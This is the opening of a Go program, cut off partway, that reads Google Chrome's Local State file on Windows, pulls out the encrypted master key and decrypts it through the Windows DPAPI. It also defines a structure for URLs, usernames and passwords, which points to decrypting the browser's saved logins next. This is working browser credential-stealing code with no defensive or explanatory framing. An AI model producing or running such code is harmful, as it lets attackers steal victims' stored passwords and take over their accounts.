package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	_ "github.com/mattn/go-sqlite3"
)

type LoginEntry struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func getMasterKey() ([]byte, error) {
	localStatePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState map[string]interface{}
	json.Unmarshal(data, &localState)
	encKeyB64 := localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string)

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil, err
	}

	encKey = encKey[5:]

	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(encKey)),
		Data: &encKey[0],
	}
	err = windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(uintptr(unsafe.Pointer(outBlob.Data))))

	return outBlobToBytes(outBlob), nil
}

func outBlobToBytes(blob windows.DataBlob) []byte {
	data := make([]byte, blob.Size)
	copy(data, (*[1 << 30]byte)(unsafe.Pointer(blob.Data))*
